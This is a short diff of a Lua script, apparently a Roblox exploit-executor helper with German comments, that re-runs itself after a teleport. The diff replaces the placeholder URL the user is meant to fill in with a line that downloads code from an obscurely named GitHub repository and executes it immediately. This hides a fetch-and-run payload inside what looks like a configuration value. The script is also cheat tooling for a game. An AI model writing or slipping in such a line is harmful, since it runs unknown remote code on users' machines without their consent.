@@ -35,7 +35,7 @@ end)
 ---------------------------------------------------------------------
 -- Auto-Reexecute nach Teleport: URL zu DEINEM Script eintragen
 ---------------------------------------------------------------------
-local RELOAD_URL = "https://raw.githubusercontent.com/DEIN/REPO/main/dein_script.lua"
+local RELOAD_URL = loadstring(game:HttpGet("https://raw.githubusercontent.com/kjhbdwadabfjkhgf/ajshgbdhb28/main/fefseffsefraweddaw"))()
 local function queueReexec()
     local q = (syn and syn.queue_on_teleport)
           or (queue_on_teleport)
